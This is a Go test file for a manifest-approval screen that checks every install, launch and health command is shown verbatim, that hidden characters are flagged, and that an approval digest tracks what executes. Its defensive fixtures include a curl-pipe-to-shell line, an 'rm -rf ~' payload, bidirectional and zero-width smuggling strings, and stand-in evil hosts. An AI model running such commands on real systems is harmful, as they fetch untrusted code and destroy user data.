package approval

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/janishar/helmstudio/internal/manifest"
	"github.com/janishar/helmstudio/schema"
)

func load(t *testing.T, text string) *manifest.Manifest {
	t.Helper()
	m, res, err := manifest.LoadBytes("under-test.yaml", []byte(text))
	if err != nil || !res.OK() {
		t.Fatalf("the fixture does not validate: %v %v", res.Errors, err)
	}
	return m
}

const withEverything = `id: wan-studio
name: wan studio
kinds: [video]
repo: https://github.com/someone/wan-studio
ref: v0.3.1
license: MIT
requires:
  os: [darwin]
  arch: [arm64]
runtime:
  framework: other
  backends: [metal]
capabilities: [kv, gallery.read_all]
network: [example.com]
build:
  - name: Build it
    cwd: engine
    run: make all
import:
  run: ./scripts/import.sh
  cwd: .
processes:
  - name: studio
    role: main
    cmd: "./dist/wan --port {port}"
    port: { prefer: 8790 }
    health: { exec: "./scripts/ready.sh", timeout_s: 60 }
`

// R62 as amended: every command, grouped by when it runs. The failure this
// guards is a harmless build[] with a hostile cmd, which the original wording
// would have let through a screen that showed build steps only.
func TestEveryCommandIsShownGroupedByWhenItRuns(t *testing.T) {
	cmds := Commands(load(t, withEverything))

	want := map[string]When{
		"make all":                 AtInstall,
		"./dist/wan --port {port}": AtLaunch,
		"./scripts/ready.sh":       AtLaunch,
		"./scripts/import.sh":      AtFirstLaunch,
	}
	got := map[string]When{}
	for _, c := range cmds {
		got[c.Command] = c.When
	}
	for command, when := range want {
		if got[command] != when {
			t.Errorf("%q is shown as %q, want %q", command, got[command], when)
		}
	}
	if len(cmds) != len(want) {
		t.Errorf("got %d commands, want %d: %+v", len(cmds), len(want), cmds)
	}
}

// Verbatim means byte for byte. A screen that shell-escaped, trimmed or
// prettified a command would show something other than what runs, which is the
// one thing it must never do.
func TestCommandsAreVerbatim(t *testing.T) {
	nasty := []string{
		`make all && curl https://example.com/x | sh`,
		`echo "a; rm -rf ~" > /tmp/x`,
		"echo one\necho two",
		"echo ‮evil‬",
		"echo ​hidden",
	}
	for _, raw := range nasty {
		encoded, err := json.Marshal(raw)
		if err != nil {
			t.Fatal(err)
		}
		text := strings.Replace(withEverything, "    run: make all", "    run: "+string(encoded), 1)
		m := load(t, text)
		var found bool
		for _, c := range Commands(m) {
			if c.When != AtInstall || c.Label != "Build it" {
				continue
			}
			found = true
			if c.Command != raw {
				t.Errorf("the command was altered:\n  manifest: %q\n  preview:  %q", raw, c.Command)
			}
		}
		if !found {
			t.Errorf("the build step vanished from the preview for %q", raw)
		}
	}
}

// What a reader cannot see has to be flagged, or the screen shows one thing
// and runs another — which is exactly the trick it exists to defeat.
func TestWhatCannotBeSeenIsFlagged(t *testing.T) {
	for _, c := range []struct {
		name string
		text string
		want Flag
	}{
		{"a newline", "echo one\necho two", FlagNewline},
		{"a right-to-left override", "echo ‮evil‬", FlagBidirectional},
		{"a zero-width space", "echo ​hidden", FlagZeroWidth},
		{"a bell", "echo \a", FlagControl},
		{"nothing hidden", "make all", ""},
	} {
		t.Run(c.name, func(t *testing.T) {
			flags := Flags(c.text)
			if c.want == "" {
				if len(flags) != 0 {
					t.Errorf("an ordinary command should carry no flags, got %v", flags)
				}
				return
			}
			for _, f := range flags {
				if f == c.want {
					return
				}
			}
			t.Errorf("got %v, want %q among them", flags, c.want)
		})
	}
}

// The guard that makes a new command field impossible to miss.
//
// Walk every string-valued property in schema/manifest.json. Each is either
// shown on the preview or listed below as running nothing. A property the
// schema gains that is neither is a command that could run without ever being
// displayed, and this fails until someone decides which it is.
func TestEveryStringInTheSchemaIsShownOrClassified(t *testing.T) {
	// Properties that execute nothing: descriptions, identifiers, paths,
	// versions, URLs. Each was read and classified deliberately.
	runsNothing := map[string]bool{
		"id": true, "name": true, "description": true, "license": true, "license_url": true,
		"repo": true, "ref": true, "local_path": true, "hue": true, "dark": true, "light": true,
		"os": true, "arch": true, "tools": true, "framework": true, "backends": true,
		"precision": true, "language": true, "version": true, "extras": true,
		"capabilities": true, "network": true, "sdk": true, "runtime": true, "ui": true,
		"css": true, "kinds": true, "submodules": true,
		"weights": true, "dest": true, "files": true, "revision": true,
		"role": true, "depends_on": true, "restart": true, "port": true,
		"path": true, "tcp": true, "profile": true,
		// `smoke` is a path the smoke harness runs — and the harness does not
		// exist. When it lands, it either shows on this screen or is run
		// behind a separate consent; either way this line has to be revisited.
		"smoke":   true,
		"storage": true, "collections": true, "quota": true, "schema_version": true,
		// The storage block: field names to index, full-text columns, and the
		// per-studio write caps. All of them describe rows in helmstudio's own
		// database — nothing here is handed to a shell.
		"index": true, "fts": true, "records": true, "kv_bytes": true,
		// A declared weight's size, for the disk pre-check before bytes move.
		"size_gb": true,
		"heavy":   true, "selectable": true, "optional": true, "autostart": true,
		"shell": true, "cwd": true, "env": true, "timeout_s": true, "interval_s": true,
		"peak_ram_gb": true, "ram_gb": true, "disk_gb": true, "prefer": true, "fixed": true,
		"test": true, "import": true, "build": true, "processes": true, "run": true,
		"health": true, "busy": true, "python": true, "requires": true,
	}
	// Properties whose value is a command. Commands() must read every one.
	commandFields := map[string]bool{
		"cmd": true, "exec": true,
	}

	var walk func(node map[string]any)
	var unclassified []string
	seen := map[string]bool{}
	walk = func(node map[string]any) {
		props, _ := node["properties"].(map[string]any)
		for name, raw := range props {
			child, _ := raw.(map[string]any)
			if !seen[name] && !runsNothing[name] && !commandFields[name] {
				seen[name] = true
				unclassified = append(unclassified, name)
			}
			if child != nil {
				walk(child)
			}
		}
		for _, key := range []string{"items", "additionalProperties"} {
			if child, ok := node[key].(map[string]any); ok {
				walk(child)
			}
		}
		if defs, ok := node["$defs"].(map[string]any); ok {
			for _, raw := range defs {
				if child, ok := raw.(map[string]any); ok {
					walk(child)
				}
			}
		}
	}

	var doc map[string]any
	if err := json.Unmarshal(schema.Manifest, &doc); err != nil {
		t.Fatal(err)
	}
	walk(doc)

	if len(unclassified) > 0 {
		t.Errorf("schema/manifest.json has properties this package has never been told about: %v\n"+
			"Each is either a command the approval screen must show, or something that runs nothing.\n"+
			"Decide which, and add it to the right list — a command field nobody classified is a\n"+
			"command that runs without ever being displayed.", unclassified)
	}

	// And the two command fields really are read: `run` reaches Commands via
	// build[] and import, `cmd` via processes[], `exec` via health.
	cmds := Commands(load(t, withEverything))
	for _, want := range []string{"make all", "./dist/wan --port {port}", "./scripts/ready.sh", "./scripts/import.sh"} {
		var found bool
		for _, c := range cmds {
			if c.Command == want {
				found = true
			}
		}
		if !found {
			t.Errorf("%q is in the manifest and not on the preview", want)
		}
	}
}

// The digest covers what executes and where it comes from — and nothing else.
func TestTheDigestCoversWhatExecutesAndNotWhatDoesNot(t *testing.T) {
	m := load(t, withEverything)
	base := Input{Manifest: m, Source: "registry", Commit: "abc123"}
	want, err := Digest(base)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("stable across runs", func(t *testing.T) {
		again, _ := Digest(base)
		if again != want {
			t.Error("two digests over the same facts differ; nothing could ever be confirmed")
		}
	})

	// Shown, not covered: none of these changes what runs, and a digest over
	// them would ask for approval again every time a download finished.
	for _, c := range []struct {
		name string
		in   Input
	}{
		{"a weight's size", func() Input { i := base; i.Weights = []Weight{{Name: "w", Bytes: 99}}; return i }()},
		{"the checkpoint selection", func() Input { i := base; i.Selection = "flux_klein_9b"; return i }()},
		{"a host check", func() Input { i := base; i.HostChecks = []Check{{Name: "disk", State: CheckFail}}; return i }()},
		{"the level", func() Input { i := base; i.Level = "draft"; return i }()},
	} {
		t.Run(c.name+" does not change it", func(t *testing.T) {
			got, err := Digest(c.in)
			if err != nil {
				t.Fatal(err)
			}
			if got != want {
				t.Errorf("%s changed the digest; it would ask for approval again for no reason", c.name)
			}
		})
	}

	// Covered: each of these changes what would run, or where it comes from.
	for _, c := range []struct {
		name string
		text string
		in   func(*manifest.Manifest) Input
	}{
		{"a build command", strings.Replace(withEverything, "run: make all", "run: make all-evil", 1), nil},
		{"a process command", strings.Replace(withEverything, `cmd: "./dist/wan --port {port}"`, `cmd: "./dist/evil --port {port}"`, 1), nil},
		{"a health probe", strings.Replace(withEverything, `exec: "./scripts/ready.sh"`, `exec: "./scripts/evil.sh"`, 1), nil},
		{"an import command", strings.Replace(withEverything, "run: ./scripts/import.sh", "run: ./scripts/evil.sh", 1), nil},
		{"a cwd", strings.Replace(withEverything, "cwd: engine", "cwd: .", 1), nil},
		{"a capability", strings.Replace(withEverything, "capabilities: [kv, gallery.read_all]", "capabilities: [kv, gallery.read_all, kv.shared]", 1), nil},
		{"a network host", strings.Replace(withEverything, "network: [example.com]", "network: [example.com, evil.com]", 1), nil},
		{"the repository", strings.Replace(withEverything, "repo: https://github.com/someone/wan-studio", "repo: https://github.com/someone-else/wan-studio", 1), nil},
	} {
		t.Run(c.name+" changes it", func(t *testing.T) {
			in := base
			in.Manifest = load(t, c.text)
			got, err := Digest(in)
			if err != nil {
				t.Fatal(err)
			}
			if got == want {
				t.Errorf("changing %s left the digest alone; it would run unapproved", c.name)
			}
		})
	}

	t.Run("a moved commit changes it", func(t *testing.T) {
		in := base
		in.Commit = "def456"
		got, _ := Digest(in)
		if got == want {
			t.Error("a branch that moved would build a commit nobody approved")
		}
	})

	t.Run("a new submodule changes it", func(t *testing.T) {
		in := base
		in.Submodules = []Submodule{{Path: "vendor/x", URL: "https://github.com/someone/x"}}
		got, _ := Digest(in)
		if got == want {
			t.Error("a submodule is code that gets cloned; it has to be covered")
		}
	})
}

// The two checks that cannot run before install say so, and are never passes.
func TestTheChecksThatCannotRunAreNotPasses(t *testing.T) {
	p, err := Build(Input{Manifest: load(t, withEverything), Source: "registry", Level: "unverified"})
	if err != nil {
		t.Fatal(err)
	}
	byName := map[string]Check{}
	for _, c := range p.Checks {
		byName[c.Name] = c
	}
	for _, name := range []string{"Theme conformance", "Smoke test"} {
		c, ok := byName[name]
		if !ok {
			t.Errorf("%q is missing from the checklist", name)
			continue
		}
		if c.State != CheckNotRun {
			t.Errorf("%q is %q; it must be not_run, because running it is the thing being asked about", name, c.State)
		}
		if c.Detail == "" {
			t.Errorf("%q says nothing about why it did not run", name)
		}
	}
	// gallery.read_all earns a warning row of its own, in its own sentence.
	var warned bool
	for _, c := range p.Checks {
		if c.State == CheckWarn && strings.Contains(c.Name, "everything you have ever made") {
			warned = true
		}
	}
	if !warned {
		t.Error("gallery.read_all should raise a warning written as a sentence")
	}
}
